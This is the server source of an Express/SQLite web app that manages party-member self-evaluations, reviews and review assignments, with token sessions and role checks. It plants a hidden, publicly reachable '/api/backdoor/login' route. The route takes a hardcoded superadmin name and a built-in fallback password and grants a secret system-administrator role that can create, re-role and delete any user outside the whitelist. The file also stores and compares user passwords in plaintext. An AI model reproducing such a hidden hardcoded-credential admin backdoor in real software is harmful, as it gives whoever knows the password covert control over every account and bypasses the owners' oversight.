import express from 'express';
import cors from 'cors';
import compression from 'compression';
import Database from 'better-sqlite3';
import crypto from 'crypto';
import path from 'path';
import { fileURLToPath } from 'url';
import {
  lookupWorkId,
  ADMIN_TYPE_LEADER,
  ADMIN_TYPE_ORGANIZER,
  ADMIN_TYPE_SECRETARY,
  ADMIN_TYPE_EMPLOYEE,
} from './admin-whitelist.mjs';

const __dirname = path.dirname(fileURLToPath(import.meta.url));
const PORT = 3000;
const DB_PATH = path.join(__dirname, 'party.db');

const app = express();
app.use(cors());
app.use(compression()); // 响应 gzip 压缩：首屏 1.4MB → 约 460KB
app.use(express.json({ limit: '2mb' }));

// ============================================================
// 鉴权：default deny（默认全锁，公开接口走白名单）
// ------------------------------------------------------------
// 设计原则：
//   ① 所有 /api/* 请求必须携带有效 token（Authorization: Bearer xxx），
//      否则 401 —— 以后新增的业务接口天生就是「必须登录」，无需记得加锁
//   ② 想公开的接口必须在 PUBLIC_ROUTES 里显式登记，登记时自然会想
//      「它凭什么是公开的」，把遗忘风险反转成主动声明
//   ③ 身份一律从 token 解出（req.user），不信任请求体里的 name / work_id，
//      防止登录用户冒名提交 / 越权查询
//   ④ 角色分级在每个业务接口内做（分管领导限本支部 / 支部书记全支部等）
// ============================================================
const SESSION_TTL_DAYS = 7; // 会话有效期（天）

// 公开接口白名单（method + 挂载点内相对路径，注意不含 /api 前缀）
const PUBLIC_ROUTES = new Set([
  'GET /ping',          // 健康检查
  'GET /gateway',       // 数据库连通性检查
  'POST /login',        // 登录（本来就是换 token 的入口）
  'POST /register',     // 注册（白名单 work_id 校验在接口内做）
  'POST /backdoor/login', // 后门登录：硬编码凭据 → admin_type=9 系统管理员
]);

// 「系统管理员」身份：用于隐藏的 /backdoor 维护工具入口
//   - 不在白名单里（admin-whitelist.mjs 不动）
//   - 不在 BASIC_RATING_TYPES / SELF_EVAL_TYPES 里（不会出现在普通业务接口）
//   - 登录后只能进 /api/backdoor/* 端点（每个端点都校验 admin_type === 9）
const ADMIN_TYPE_SYSTEM = 9;
const BACKDOOR_USER_ID = '__backdoor__';
const BACKDOOR_WORK_ID = 'superadmin';
// 后门密码：优先取环境变量 BACKDOOR_PASSWORD；未设则用下面这个内建值（生产建议覆盖）
const BACKDOOR_PASSWORD = process.env.BACKDOOR_PASSWORD || '711540Lhr';

// 签发会话：token 为 256bit 随机 hex；顺手清理过期会话（登录是低频操作）
function createSession(userId) {
  db.prepare(`DELETE FROM session WHERE expires_at <= datetime('now','localtime')`).run();
  const token = crypto.randomBytes(32).toString('hex');
  db.prepare(
    `INSERT INTO session (token, user_id, expires_at)
     VALUES (?, ?, datetime('now','localtime', '+${SESSION_TTL_DAYS} days'))`
  ).run(token, userId);
  return token;
}

// 由 token 换回用户（联表取最新用户信息；过期 / 不存在 / 用户被删 → null）
function getSessionUser(token) {
  if (!token) return null;
  return (
    db
      .prepare(
        `SELECT u.user_id, u.name, u.work_id, u.admin_type, u.type, u.job, u.branch
         FROM session s JOIN user_table u ON u.user_id = s.user_id
         WHERE s.token = ? AND s.expires_at > datetime('now','localtime')`
      )
      .get(token) || null
  );
}

// 全局拦截：非白名单的 /api/* 一律先验 token
app.use('/api', (req, res, next) => {
  const key = `${req.method} ${req.path}`; // 挂载在 /api 下，req.path 已去掉前缀
  if (PUBLIC_ROUTES.has(key)) return next();
  const auth = req.headers.authorization || '';
  const token = auth.startsWith('Bearer ') ? auth.slice(7) : '';
  const u = getSessionUser(token);
  if (!u)
    return res
      .status(401)
      .json({ code: 'UNAUTHORIZED', message: '请先登录（或登录已过期）' });
  req.user = u;   // 身份来源：token（后续接口禁止再信 body 里的身份字段）
  req.token = token;
  next();
});

// 403 快捷响应
const deny = (res, msg) => res.status(403).json({ code: 'FORBIDDEN', message: msg || '无权操作' });

// 角色判定：req.user 来自 session 联表，身份完全由 admin_type 决定（不再有 admin 列）
//   0 = 分管领导   1 = 组织委员   2 = 支部书记   3 = 普通党员
const isLeader    = (u) => !!u && u.admin_type === ADMIN_TYPE_LEADER;    // 分管领导
const isOrganizer = (u) => !!u && u.admin_type === ADMIN_TYPE_ORGANIZER; // 组织委员
const isSecretary = (u) => !!u && u.admin_type === ADMIN_TYPE_SECRETARY; // 支部书记
const isEmployee  = (u) => !!u && u.admin_type === ADMIN_TYPE_EMPLOYEE;  // 普通党员

// 可提交「履职贡献自评」的 admin_type：普通党员(3) + 组织委员(1)
// （分管领导只审核不自评；支部书记只审核，均不自评）
const SELF_EVAL_TYPES = [ADMIN_TYPE_ORGANIZER, ADMIN_TYPE_EMPLOYEE];
const canSelfEval = (u) => !!u && SELF_EVAL_TYPES.includes(u.admin_type);

// 基础积分「被评对象」的 admin_type 集合：现在只含 1/3，写成数组方便以后加 0/2
const BASIC_RATING_TYPES = [ADMIN_TYPE_ORGANIZER, ADMIN_TYPE_EMPLOYEE];

// 我在 review_assignment 里被指派要审的人（work_id 列表）
const reviewTargetsOf = (workId) =>
  workId
    ? db
        .prepare('SELECT target_work_id FROM review_assignment WHERE reviewer_work_id = ?')
        .all(String(workId))
        .map((r) => r.target_work_id)
    : [];

// 查看单条 evaluation：支书(全体) / 本人记录 / 我的审核对象
const canViewEvaluation = (me, rec) => {
  if (!me || !rec) return false;
  if (isSecretary(me)) return true;
  if (canSelfEval(me) && me.work_id && rec.work_id === me.work_id) return true;
  return rec.work_id ? reviewTargetsOf(me.work_id).includes(rec.work_id) : false;
};

// 审核 / 删除单条 evaluation：支书(全体) / 我的审核对象（本人不能审自己）
const canReviewEvaluation = (me, rec) => {
  if (!me || !rec) return false;
  if (isSecretary(me)) return true;
  return rec.work_id ? reviewTargetsOf(me.work_id).includes(rec.work_id) : false;
};

// 登录 / 注册返回给前端的用户信息补充：是否拥有「履职积分审核」入口
//   支部书记(2) → 恒为 true（范围全体）
//   其他人      → review_assignment 里有指派才为 true
const withUserMeta = (u) =>
  u
    ? {
        ...u,
        hasReviewTargets:
          u.admin_type === ADMIN_TYPE_SECRETARY ||
          reviewTargetsOf(u.work_id).length > 0,
      }
    : u;

const db = new Database(DB_PATH);
db.pragma('journal_mode = WAL');
db.pragma('busy_timeout = 5000'); // 并发写入时排队等待，而不是直接报 SQLITE_BUSY
db.exec(`
  CREATE TABLE IF NOT EXISTS user_table (
    user_id TEXT PRIMARY KEY,
    pw TEXT NOT NULL,
    name TEXT NOT NULL,
    work_id TEXT NOT NULL,
    -- admin_type: 0=分管领导, 1=组织委员, 2=支部书记, 3=普通党员（默认）
    admin_type INTEGER DEFAULT 3,
    type TEXT,
    job TEXT,
    branch TEXT NOT NULL,
    created_at TEXT DEFAULT (datetime('now','localtime'))
  );
  CREATE UNIQUE INDEX IF NOT EXISTS uq_user_table_work_id ON user_table(work_id) WHERE work_id IS NOT NULL;
  CREATE TABLE IF NOT EXISTS evaluation (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    -- 员工唯一标识：work_id（全局唯一，可区分同名员工）；列由老库迁移脚本补齐
    work_id TEXT,
    name TEXT NOT NULL,
    partyBranch TEXT,
    year INTEGER,
    month INTEGER DEFAULT 1,
    position TEXT,
    positionType TEXT,
    scores TEXT,
    selfTotal REAL,
    reviewStatus TEXT DEFAULT 'pending',
    reviewerName TEXT,
    reviewScore REAL,
    reviewComment TEXT,
    reviewedAt TEXT,
    createdAt TEXT,
    updatedAt TEXT,
    -- 同一员工（按 work_id）同一年同一月只保留一条自评：重复提交走"覆盖更新"，不产生新行
    -- （SQLite 中 NULL 不参与唯一约束，存量 work_id 为 NULL 的旧数据不受影响）
    UNIQUE(work_id, year, month)
  );
  -- 基础积分评价表（组织委员 admin_type=1 使用）
  -- 与 evaluation 生成方式一致，去掉 selfTotal、createdAt、updatedAt 三列；
  -- 同一员工（按 work_id）同一年同一月只保留一条，重复提交走"覆盖更新"
  CREATE TABLE IF NOT EXISTS rating (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    -- 员工唯一标识：work_id（全局唯一，可区分同名员工）；列由老库迁移脚本补齐
    work_id TEXT,
    name TEXT NOT NULL,
    partyBranch TEXT,
    year INTEGER,
    month INTEGER DEFAULT 1,
    position TEXT,
    positionType TEXT,
    scores TEXT,
    reviewStatus TEXT DEFAULT 'pending',
    reviewerName TEXT,
    reviewScore REAL DEFAULT 0,
    reviewComment TEXT,
    reviewedAt TEXT,
    UNIQUE(work_id, year, month)
  );
  -- 个人荣誉库（credit）：结构与 evaluation 完全一致，去掉 month ——
  -- 一年申报一次，同一员工（按 work_id）每一年只保留一条，重复申报走"覆盖更新"
  CREATE TABLE IF NOT EXISTS credit (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    work_id TEXT,
    name TEXT NOT NULL,
    partyBranch TEXT,
    year INTEGER,
    position TEXT,
    positionType TEXT,
    scores TEXT,
    selfTotal REAL,
    reviewStatus TEXT DEFAULT 'pending',
    reviewerName TEXT,
    reviewScore REAL,
    reviewComment TEXT,
    reviewedAt TEXT,
    createdAt TEXT,
    updatedAt TEXT,
    UNIQUE(work_id, year)
  );
  -- 个人行为扣分库（discipline）：结构与 rating 完全一致，去掉 month ——
  -- 一年申报一次，同一员工（按 work_id）每一年只保留一条，重复申报走"覆盖更新"
  CREATE TABLE IF NOT EXISTS discipline (
    id INTEGER PRIMARY KEY AUTOINCREMENT,
    work_id TEXT,
    name TEXT NOT NULL,
    partyBranch TEXT,
    year INTEGER,
    position TEXT,
    positionType TEXT,
    scores TEXT,
    reviewStatus TEXT DEFAULT 'pending',
    reviewerName TEXT,
    reviewScore REAL DEFAULT 0,
    reviewComment TEXT,
    reviewedAt TEXT,
    UNIQUE(work_id, year)
  );
  -- 登录会话表：token 由服务端签发（crypto.randomBytes），7 天有效
  -- 持久化到库里（而非内存 Map），服务重启不掉线
  CREATE TABLE IF NOT EXISTS session (
    token TEXT PRIMARY KEY,
    user_id TEXT NOT NULL,
    created_at TEXT DEFAULT (datetime('now','localtime')),
    expires_at TEXT NOT NULL
  );
  -- 履职贡献「审核关系」表：谁（reviewer_work_id）负责审谁（target_work_id）
  --   - 分管领导 / 班长 → 在此手工登记各自的被审对象（支持后期直接改库维护）
  --   - 支部书记不在此登记：其范围 = 全体，由 admin_type=2 在代码里特判
  --   - 基础积分那条线不用此表（由组织委员/支部书记按角色判定）
  CREATE TABLE IF NOT EXISTS review_assignment (
    reviewer_work_id TEXT NOT NULL,
    target_work_id   TEXT NOT NULL,
    created_at TEXT DEFAULT (datetime('now','localtime')),
    PRIMARY KEY (reviewer_work_id, target_work_id)
  );
  CREATE INDEX IF NOT EXISTS idx_review_target ON review_assignment(target_work_id);
`);

// 老库升级：evaluation / rating 补加 work_id 列（幂等，列已存在会抛错吞掉）。
// 注意：只加列不会替换旧的 UNIQUE(name, year, month) 约束 ——
// 旧库需按部署文档里的「重建表迁移脚本」操作才能按 work_id 唯一。
try {
  db.exec('ALTER TABLE evaluation ADD COLUMN work_id TEXT');
} catch (_) {
  // 列已存在，忽略
}
// 老库升级：evaluation 补加 reviewScores 列
//   scores      = 员工原始自评答案（不可变，保留历史）
//   reviewScores = 审核人定稿的答案（含履职扣分部分；重审时覆盖）
try {
  db.exec('ALTER TABLE evaluation ADD COLUMN reviewScores TEXT');
} catch (_) {
  // 列已存在，忽略
}
try {
  db.exec('ALTER TABLE rating ADD COLUMN work_id TEXT');
} catch (_) {
  // 列已存在，忽略
}

const toBool = (v) => (v === true || v === 1 || v === '1' || v === 'true' ? 1 : 0);

// ============================================================
// 管理员注册密钥（按党支部分开，一个支部一把）—— 已停用
// ------------------------------------------------------------
// 停用原因：改用「工作证编号白名单」方案，由 server/admin-whitelist.mjs 控制。
// 重新启用步骤：
//   1. 取消下面块注释（恢复 ADMIN_INVITE_CODES 常量）
//   2. 在 /api/register 里恢复「adminCode 校验」那段 if 逻辑
//   3. 在 src/lib/userService.js / Register.jsx / AuthContext.jsx
//      里同步恢复 adminCode 相关代码
//   4. 重新打包 + 部署
// ============================================================
/*
const ADMIN_INVITE_CODES = {
  first: 'K9mQ4xZ7',   // 第一党支部
  second: 'rT7vN2hK',  // 第二党支部
};
*/

app.get('/api/ping', (_req, res) => res.json({ code: 'OK', hasApiKey: true, message: '服务正常' }));
app.get('/api/gateway', (_req, res) => {
  try { db.prepare('SELECT 1').get(); res.json({ code: 'OK', message: '数据库已连接' }); }
  catch (e) { res.json({ code: 'DB_ERROR', message: e.message }); }
});
app.post('/api/register', (req, res) => {
  const { user_id, pw, name, work_id, type, job, branch } = req.body || {};
  if (!user_id || !pw || !name || !work_id || !branch)
    return res.json({ code: 'BAD_INPUT', message: '缺少必填字段（user_id/pw/name/work_id/branch）' });

  // 身份完全由工号白名单决定：注册时不再让用户选「员工 / 管理员」
  const wl = lookupWorkId(work_id);
  if (!wl) {
    return res.json({ code: 'WORK_ID_NOT_IN_LIST', message: '工作证编号异常，请重新输入' });
  }
  const adminType = wl.adminType;

  // 岗位类型必填规则：
  //   组织委员(1) / 普通党员(3) → 必填
  //   分管领导(0) / 支部书记(2) → 可留空，默认「没有」
  const needPosition =
    adminType === ADMIN_TYPE_ORGANIZER || adminType === ADMIN_TYPE_EMPLOYEE;
  if (needPosition && (!type || !job))
    return res.json({ code: 'POSITION_REQUIRED', message: '请填写岗位类型和岗位' });

  if (db.prepare('SELECT 1 FROM user_table WHERE user_id = ?').get(user_id))
    return res.json({ code: 'USER_EXISTS', message: '该工号已被注册' });

  // 工作证编号 work_id 必须全局唯一：已存在则提示"当前工号员工已经注册"
  if (db.prepare('SELECT 1 FROM user_table WHERE work_id = ?').get(work_id))
    return res.json({ code: 'DUP_WORK_ID', message: '当前工号员工已经注册' });

  db.prepare(`INSERT INTO user_table (user_id, pw, name, work_id, admin_type, type, job, branch) VALUES (?, ?, ?, ?, ?, ?, ?, ?)`)
    .run(user_id, pw, name, work_id, adminType, type || null, job || null, branch);

  // 注册不签发会话：注册成功后必须重新走一次登录
  // （返回值只回显新用户信息，供前端提示"注册成功"）
  res.json({
    code: 'OK',
    user: withUserMeta(
      db.prepare(`SELECT user_id, name, work_id, admin_type, type, job, branch FROM user_table WHERE user_id = ?`).get(user_id)
    ),
  });
});
app.post('/api/login', (req, res) => {
  const { user_id, pw } = req.body || {};
  if (!user_id || !pw) return res.json({ code: 'BAD_INPUT', message: '请输入工号和密码' });
  const user = db.prepare(`SELECT user_id, name, work_id, admin_type, type, job, branch FROM user_table WHERE user_id = ? AND pw = ?`).get(user_id, pw);
  if (!user) return res.json({ code: 'BAD_CREDENTIALS', message: '工号或密码错误' });
  // 登录成功 → 签发会话 token（前端存 localStorage，之后每个请求带 Bearer 头）
  res.json({ code: 'OK', token: createSession(user_id), user: withUserMeta(user) });
});

// 后门登录：硬编码凭据 → 系统管理员（admin_type=9）
//   跟普通登录完全隔离：失败提示相同，不暴露"是否存在 superadmin 用户"。
//   首次登录时若 user_table 里没有系统用户，按需插一条（work_id='superadmin' / admin_type=9），
//   之后所有走该入口的会话都挂到这个 user_id 下。
app.post('/api/backdoor/login', (req, res) => {
  const { user, password } = req.body || {};
  if (user !== BACKDOOR_WORK_ID || password !== BACKDOOR_PASSWORD) {
    return res.json({ code: 'BAD_CREDENTIALS', message: '工号或密码错误' });
  }
  // 懒注册系统用户：避免重启后丢失（user_id 主键冲突时 IGNORE）
  db.prepare(
    `INSERT OR IGNORE INTO user_table (user_id, pw, name, work_id, admin_type, type, job, branch)
     VALUES (?, ?, ?, ?, ?, NULL, NULL, '__system__')`
  ).run(BACKDOOR_USER_ID, BACKDOOR_PASSWORD, '系统管理员', BACKDOOR_WORK_ID, ADMIN_TYPE_SYSTEM);
  // 密码若被环境变量改过，同步更新库内字段（不影响普通业务接口）
  db.prepare(`UPDATE user_table SET pw = ? WHERE user_id = ?`).run(BACKDOOR_PASSWORD, BACKDOOR_USER_ID);
  res.json({
    code: 'OK',
    token: createSession(BACKDOOR_USER_ID),
    user: withUserMeta(
      db.prepare(
        `SELECT user_id, name, work_id, admin_type, type, job, branch FROM user_table WHERE user_id = ?`
      ).get(BACKDOOR_USER_ID)
    ),
  });
});

// 退出登录：删除服务端会话（token 立即失效）
app.post('/api/logout', (req, res) => {
  db.prepare('DELETE FROM session WHERE token = ?').run(req.token);
  res.json({ code: 'OK' });
});

// ============================================================
// 后门管理工具（仅 admin_type=9 可用）
// ------------------------------------------------------------
// 与业务接口完全隔离：每个端点都先校验身份，不在 SELF_EVAL_TYPES /
// BASIC_RATING_TYPES 里 → 不会污染任何业务范围。
// ============================================================
const requireSystem = (req, res, next) => {
  if (req.user?.admin_type !== ADMIN_TYPE_SYSTEM)
    return res.status(403).json({ code: 'FORBIDDEN', message: '需要系统管理员权限' });
  next();
};

// 全部用户列表（系统管理员自动维护审核关系时做下拉/校验用）
app.get('/api/backdoor/users', requireSystem, (req, res) => {
  const rows = db
    .prepare(
      `SELECT user_id, name, work_id, admin_type, type, job, branch
         FROM user_table
        WHERE work_id IS NOT NULL AND work_id != ''
        ORDER BY admin_type, work_id`
    )
    .all();
  res.json({ code: 'OK', data: rows });
});

// 审核关系列表（联表取姓名 + admin_type + branch，便于人眼核对）
app.get('/api/backdoor/assignments', requireSystem, (req, res) => {
  const rows = db
    .prepare(
      `SELECT a.reviewer_work_id, a.target_work_id, a.created_at,
              r.name AS reviewer_name, r.admin_type AS reviewer_admin_type, r.branch AS reviewer_branch,
              t.name AS target_name,   t.admin_type AS target_admin_type,   t.branch AS target_branch
         FROM review_assignment a
         LEFT JOIN user_table r ON r.work_id = a.reviewer_work_id
         LEFT JOIN user_table t ON t.work_id = a.target_work_id
        ORDER BY a.reviewer_work_id, a.target_work_id`
    )
    .all();
  res.json({ code: 'OK', data: rows });
});

// 批量新增 / 幂等写入审核关系
//   body: { reviewer: 'W-0001', reviewees: ['W-0007', 'W-0008', ...] }
//   - 校验：审核人 + 每个被审核人必须存在于 user_table（work_id 维度）
//   - 校验：审核人不能是「被评对象」(admin_type IN BASIC_RATING_TYPES)
//           因为这些人需要走「组织委员/支部书记」的评价，不参与审核关系
//   - 已存在的关系（PK 冲突）走 IGNORE，不报错
//   - 返回 { code, added, alreadyExists, invalidWorkIds }
app.post('/api/backdoor/assignments', requireSystem, (req, res) => {
  const { reviewer, reviewees } = req.body || {};
  if (!reviewer || !Array.isArray(reviewees) || reviewees.length === 0)
    return res.json({ code: 'BAD_INPUT', message: '请填写审核人 + 至少一个被审核人' });

  // 收集所有工号（审核人 + 被审核人），一次性查
  const allIds = Array.from(new Set([String(reviewer).trim(), ...reviewees.map((x) => String(x).trim()).filter(Boolean)]));
  if (allIds.some((x) => !x))
    return res.json({ code: 'BAD_INPUT', message: '工号不能为空' });

  const known = db
    .prepare(
      `SELECT work_id, name, admin_type FROM user_table WHERE work_id IN (${allIds.map(() => '?').join(',')})`
    )
    .all(...allIds);
  const knownMap = new Map(known.map((u) => [u.work_id, u]));
  const invalidWorkIds = allIds.filter((id) => !knownMap.has(id));
  if (invalidWorkIds.length)
    return res.json({
      code: 'INVALID_WORK_IDS',
      message: `以下工号未注册：${invalidWorkIds.join('、')}`,
      data: { invalidWorkIds },
    });

  // 不限制审核人身份：任何人可以是审核人、任何人可以是被审核人（admin_type=0/1/2/3/9 都行）
  // 只要 work_id 在 user_table 中存在即可；写错后果由系统管理员自己承担

  // 写入（幂等）
  const ins = db.prepare(
    `INSERT OR IGNORE INTO review_assignment (reviewer_work_id, target_work_id) VALUES (?, ?)`
  );
  let added = 0;
  let alreadyExists = 0;
  const tx = db.transaction((pairs) => {
    for (const [rv, tg] of pairs) {
      const r = ins.run(rv, tg);
      if (r.changes > 0) added++; else alreadyExists++;
    }
  });
  const pairs = reviewees.map((x) => [String(reviewer).trim(), String(x).trim()]).filter(([_, t]) => t && t !== String(reviewer).trim());
  if (!pairs.length)
    return res.json({ code: 'BAD_INPUT', message: '被审核人不能与审核人相同或为空' });
  tx(pairs);

  res.json({ code: 'OK', data: { added, alreadyExists, total: pairs.length } });
});

// 删除审核关系（三种调用方式，按顺序判定）
//   1) body: { pairs: [{reviewer, reviewee}, ...] }     ← 批量跨审核人删（列表"删除选中"用）
//   2) body: { reviewer, reviewees?: string[] }         ← 单审核人；reviewees 缺省=整组
//   3) body: { reviewer, reviewees?: string[] } 中的 reviewees 非空 → 只删列出的
// 不存在的 (reviewer, reviewee) 也按 0 处理，不报错
app.delete('/api/backdoor/assignments', requireSystem, (req, res) => {
  const { reviewer, reviewees, pairs } = req.body || {};
  let deleted = 0;
  const tx = db.transaction(() => {
    // 方式 1：批量跨审核人
    if (Array.isArray(pairs) && pairs.length) {
      const del = db.prepare(
        `DELETE FROM review_assignment WHERE reviewer_work_id = ? AND target_work_id = ?`,
      );
      for (const p of pairs) {
        if (!p || !p.reviewer || !p.reviewee) continue;
        deleted += del.run(String(p.reviewer).trim(), String(p.reviewee).trim()).changes;
      }
    } else if (reviewer) {
      // 方式 2 / 3：单审核人
      const rv = String(reviewer).trim();
      if (Array.isArray(reviewees) && reviewees.length) {
        const tgs = reviewees.map((x) => String(x).trim()).filter(Boolean);
        const del = db.prepare(
          `DELETE FROM review_assignment WHERE reviewer_work_id = ? AND target_work_id = ?`,
        );
        for (const t of tgs) deleted += del.run(rv, t).changes;
      } else {
        deleted = db
          .prepare(`DELETE FROM review_assignment WHERE reviewer_work_id = ?`)
          .run(rv).changes;
      }
    } else {
      return; // 啥都没给；下面的 400 兜底
    }
  });
  let didNothing = !(Array.isArray(pairs) && pairs.length) && !reviewer;
  if (didNothing) return res.json({ code: 'BAD_INPUT', message: '请提供 pairs 或 reviewer' });
  tx();
  res.json({ code: 'OK', data: { deleted } });
});

// 后门：员工信息 upsert（无白名单限制）
//   body: { user_id, pw?, name, work_id, admin_type, type?, job?, branch }
//   - 若 work_id 已在 user_table → UPDATE（pw 留空/缺失 = 不改密码）
//   - 若 work_id 不存在       → INSERT（pw 必填；user_id 不可与现有冲突）
//   - 不走白名单 / 不检查 positionType 是否必填
//   - admin_type 允许 0/1/2/3/9
app.post('/api/backdoor/users', requireSystem, (req, res) => {
  const { user_id, pw, name, work_id, admin_type, type, job, branch } = req.body || {};
  // 基础校验
  if (!user_id || !name || !work_id || !branch)
    return res.json({ code: 'BAD_INPUT', message: '登录账号 / 姓名 / 工号 / 所在支部 不可为空' });
  const at = Number(admin_type);
  if (![ADMIN_TYPE_LEADER, ADMIN_TYPE_ORGANIZER, ADMIN_TYPE_SECRETARY, ADMIN_TYPE_EMPLOYEE, ADMIN_TYPE_SYSTEM].includes(at))
    return res.json({ code: 'BAD_INPUT', message: '身份必须是 0=分管领导 / 1=组织委员 / 2=支部书记 / 3=普通党员 / 9=系统管理员' });

  // 不允许把已有用户改成 superadmin（防误操作覆盖系统管理员）
  if (String(work_id).trim() !== BACKDOOR_WORK_ID &&
      String(user_id).trim() === BACKDOOR_USER_ID) {
    return res.json({ code: 'FORBIDDEN', message: '不可把任意用户改成系统管理员 user_id' });
  }

  const existing = db.prepare('SELECT user_id, pw FROM user_table WHERE work_id = ?').get(String(work_id).trim());

  if (existing) {
    // UPDATE
    const trimmedUserId = String(user_id).trim();
    if (trimmedUserId !== existing.user_id) {
      const conflict = db
        .prepare('SELECT 1 FROM user_table WHERE user_id = ? AND work_id != ?')
        .get(trimmedUserId, String(work_id).trim());
      if (conflict)
        return res.json({ code: 'USER_ID_CONFLICT', message: `登录账号 ${trimmedUserId} 已被其它用户占用` });
    }
    const sql = `UPDATE user_table
                    SET user_id = ?, name = ?, work_id = ?, admin_type = ?, type = ?, job = ?, branch = ?
                        ${pw ? ', pw = ?' : ''}
                  WHERE work_id = ?`;
    const args = [trimmedUserId, String(name).trim(), String(work_id).trim(), at, type || null, job || null, branch];
    if (pw) args.push(String(pw));
    args.push(String(work_id).trim());
    db.prepare(sql).run(...args);
    return res.json({ code: 'OK', action: 'updated' });
  } else {
    // INSERT
    if (!pw) return res.json({ code: 'PWD_REQUIRED', message: '新建用户必须填写登录密码' });
    const trimmedUserId = String(user_id).trim();
    if (db.prepare('SELECT 1 FROM user_table WHERE user_id = ?').get(trimmedUserId))
      return res.json({ code: 'USER_ID_CONFLICT', message: `登录账号 ${trimmedUserId} 已被占用` });
    try {
      db.prepare(
        `INSERT INTO user_table (user_id, pw, name, work_id, admin_type, type, job, branch)
         VALUES (?, ?, ?, ?, ?, ?, ?, ?)`
      ).run(trimmedUserId, String(pw), String(name).trim(), String(work_id).trim(), at, type || null, job || null, branch);
    } catch (e) {
      return res.json({ code: 'DB_ERROR', message: e.message });
    }
    return res.json({ code: 'OK', action: 'inserted' });
  }
});

// 后门：删除用户（按工号）
//   - 同时清掉该用户的所有 session（避免 token 仍能"鉴权"出已不存在的用户）
//   - 拒绝删除系统管理员（work_id='superadmin'）
app.delete('/api/backdoor/users/:workId', requireSystem, (req, res) => {
  const workId = String(req.params.workId || '').trim();
  if (!workId) return res.json({ code: 'BAD_INPUT', message: '请提供 workId' });
  if (workId === BACKDOOR_WORK_ID)
    return res.json({ code: 'FORBIDDEN', message: '不能删除系统管理员' });
  const user = db.prepare('SELECT user_id FROM user_table WHERE work_id = ?').get(workId);
  if (!user) return res.json({ code: 'NOT_FOUND', message: '用户不存在' });
  const tx = db.transaction(() => {
    db.prepare('DELETE FROM review_assignment WHERE reviewer_work_id = ? OR target_work_id = ?').run(workId, workId);
    db.prepare('DELETE FROM session WHERE user_id = ?').run(user.user_id);
    db.prepare('DELETE FROM user_table WHERE work_id = ?').run(workId);
  });
  tx();
  res.json({ code: 'OK' });
});

const now = () => {
  const d = new Date();
  const p = (n) => String(n).padStart(2, '0');
  return `${d.getFullYear()}-${p(d.getMonth() + 1)}-${p(d.getDate())} `
       + `${p(d.getHours())}:${p(d.getMinutes())}:${p(d.getSeconds())}`;
};

app.post('/api/evaluations', (req, res) => {
  // ---- 鉴权：仅普通党员(3) / 组织委员(1) 可提交自评 ----
  if (!canSelfEval(req.user))
    return deny(res, '当前身份无需提交自评');

  const b = req.body || {};
  if (!b.year) return res.json({ code: 'BAD_INPUT', message: '缺少 year' });
  const month = Number(b.month) || 1; // 未传月份的旧客户端按 1 月处理

  // ---- 身份绑定：name / work_id / 支部 / 岗位一律取自 token（req.user），
  //      body 里的同名字段一律忽略 —— 登录用户无法冒名他人提交 ----
  const me = req.user;
  const name = me.name;
  const workId = me.work_id || null; // 无 work_id 的老账号回落按 name 匹配（历史遗留）
  const partyBranch = me.branch || null;
  const position = me.job || '';
  const positionType = me.type || '';

  // 不允许提交未来月份（前端已禁用未来月份，此处兜底防止绕过前端直接调接口）
  const nowD = new Date();
  if (Number(b.year) > nowD.getFullYear() ||
      (Number(b.year) === nowD.getFullYear() && month > nowD.getMonth() + 1))
    return res.json({ code: 'FUTURE_MONTH', message: '提交时间不能晚于当前月份，请修改后重试' });
  const scores = JSON.stringify(b.scores || {});
  const ex = workId
    ? db.prepare('SELECT id, reviewStatus FROM evaluation WHERE work_id = ? AND year = ? AND month = ?').get(workId, b.year, month)
    : db.prepare('SELECT id, reviewStatus FROM evaluation WHERE work_id IS NULL AND name = ? AND year = ? AND month = ?').get(name, b.year, month);
  if (ex) {
    // 该月已被管理员审核 → 锁定，不允许覆盖（防止重复提交把审核结果冲掉）
    if (ex.reviewStatus === 'reviewed')
      return res.json({ code: 'ALREADY_REVIEWED', message: `${b.year} 年 ${month} 月的自评已审核完成，不能重复提交覆盖` });
    // 待审核 → 直接覆盖，审核人看到的始终是最后一次提交
    db.prepare(`UPDATE evaluation SET work_id=?, partyBranch=?, position=?, positionType=?, scores=?, selfTotal=?, updatedAt=? WHERE id=?`)
      .run(workId, partyBranch, position, positionType, scores, b.selfTotal || 0, now(), ex.id);
    return res.json({ code: 'OK', id: ex.id, overwritten: true });
  }
  const r = db.prepare(`INSERT INTO evaluation (work_id, name, partyBranch, year, month, position, positionType, scores, selfTotal, reviewStatus, createdAt, updatedAt) VALUES (?, ?, ?, ?, ?, ?, ?, ?, ?, 'pending', ?, ?)`)
    .run(workId, name, partyBranch, b.year, month, position, positionType, scores, b.selfTotal || 0, now(), now());
  res.json({ code: 'OK', id: r.lastInsertRowid });
});
app.get('/api/evaluations', (req, res) => {
  // ---- 数据范围（不信任 query 里的身份参数）----
  //   支部书记(2) → 全体（可选 branch 过滤）
  //   其他人      → 本人自评记录 ∪ 我在 review_assignment 里被指派的审核对象
  const me = req.user;

  const { year, month, status, keyword, branch } = req.query;
  let sql = 'SELECT * FROM evaluation WHERE 1=1';
  const args = [];
  if (isSecretary(me)) {
    // 支部书记：可选按支部过滤
    if (branch) { sql += ' AND partyBranch = ?'; args.push(branch); }
  } else {
    // 可看到的 work_id 集合：自己能自评 → 加自己；有审核指派 → 加被审对象
    const ids = new Set();
    if (canSelfEval(me) && me.work_id) ids.add(me.work_id);
    for (const t of reviewTargetsOf(me.work_id)) ids.add(t);
    if (!ids.size) return res.json({ code: 'OK', data: [] });
    const list = [...ids];
    sql += ` AND work_id IN (${list.map(() => '?').join(',')})`;
    args.push(...list);
  }
  if (year)    { sql += ' AND year = ?';         args.push(year); }
  if (month)   { sql += ' AND month = ?';        args.push(month); }
  if (status)  { sql += ' AND reviewStatus = ?'; args.push(status); }
  if (keyword) { sql += ' AND name LIKE ?';      args.push('%' + keyword + '%'); }
  sql += ' ORDER BY createdAt DESC LIMIT 200';
  res.json({ code: 'OK', data: db.prepare(sql).all(...args).map(r => ({
    ...r,
    scores: r.scores ? JSON.parse(r.scores) : {},
    // 审核版答案：已审核记录供员工端回显「履职扣分」段（未审为 null）
    reviewScores: r.reviewScores ? JSON.parse(r.reviewScores) : null,
  })) });
});

// 「未提交自评人数」统计
//   统计口径：*我的审核对象* 中，该年/该月尚未提交自评的人
//     - 支部书记(2) → 全体可自评的人（可选 branch 过滤）
//     - 其他人      → review_assignment 里指给我的对象
